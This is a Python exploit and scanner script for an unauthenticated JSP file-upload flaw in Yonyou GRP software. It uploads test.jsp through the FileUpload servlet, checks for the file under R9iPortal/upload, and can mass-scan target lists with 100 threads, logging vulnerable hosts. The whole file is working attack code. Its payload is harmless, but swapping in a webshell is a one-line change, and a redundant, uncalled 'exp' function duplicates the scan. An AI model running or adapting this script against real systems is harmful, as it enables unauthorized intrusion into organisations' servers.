import sys,requests,time,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'

def banner():
    test = """
 
██╗   ██╗ ██████╗ ███╗   ██╗ ██████╗██╗   ██╗ ██████╗ ██╗   ██╗
╚██╗ ██╔╝██╔═══██╗████╗  ██║██╔════╝╚██╗ ██╔╝██╔═══██╗██║   ██║
 ╚████╔╝ ██║   ██║██╔██╗ ██║██║  ███╗╚████╔╝ ██║   ██║██║   ██║
  ╚██╔╝  ██║   ██║██║╚██╗██║██║   ██║ ╚██╔╝  ██║   ██║██║   ██║
   ██║   ╚██████╔╝██║ ╚████║╚██████╔╝  ██║   ╚██████╔╝╚██████╔╝
   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝   ╚═╝    ╚═════╝  ╚═════╝                                                              
                                         version:1.1.0              
                                         author:Hardog
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='用友GRP 文件上传')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='File Path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    try:
        payload_url = '/servlet/FileUpload?fileName=test.jsp&actionID=update'
        url = target + payload_url
        headers = {
            'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0',
            'Content-Length':'51',
            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Encoding':'gzip, deflate',
            'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Connection':'close',
        }
        data = '<% out.println(""This page has a vulnerability!"");%>'
        
        # 尝试上传恶意文件
        res = requests.post(url=url, headers=headers, data=data, timeout=5, verify=False)
        
        if res.status_code == 200:
            # 如果上传成功，尝试访问上传的文件来验证漏洞
            payload_path = '/R9iPortal/upload/test.jsp'
            url = target + payload_path
            res = requests.get(url=url, verify=False)
            if "This page has a vulnerability" in res.text:
                print(f"[+] {GREEN}该网站存在文件上传漏洞，URL为: {target}\n{RESET}")
                with open("result.txt", "a", encoding="utf-8") as fp:
                    fp.write(target + '\n')
            else:
                print(f"[-] 恶意代码执行失败，漏洞利用未成功，URL为: {target}")
        else:
            print(f"[-] 该网站不存在文件上传漏洞")
    except Exception as e:
        print(f"[*]该网站无法访问")

def exp(target):
    try:
        payload_url = '/servlet/FileUpload?fileName=test.jsp&actionID=update'
        url = target + payload_url
        headers = {
            'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0',
            'Content-Length':'51',
            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Encoding':'gzip, deflate',
            'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Connection':'close',
        }
        data = '<% out.println(""This page has a vulnerability!"");%>'
        
        # 尝试上传恶意文件
        res = requests.post(url=url, headers=headers, data=data, timeout=5, verify=False)
        
        if res.status_code == 200:
            # 如果上传成功，尝试访问上传的文件来验证漏洞
            payload_path = '/R9iPortal/upload/test.jsp'
            url = target + payload_path
            res = requests.get(url=url, verify=False)
            if "This page has a vulnerability" in res.text:
                print(f"[+] {GREEN}该网站存在文件上传漏洞，URL为: {url}\n{RESET}")
                with open("exploited_targets.txt", "a", encoding="utf-8") as file:
                    file.write(target + '\n')
            else:
                print(f"[-] 恶意代码执行失败，漏洞利用未成功，URL为: {target}")
        else:
            print(f"[-]该网站不存在文件上传漏洞")
    except Exception as e:
        print(f"[*]该网站无法访问")


if __name__ == '__main__':
    main()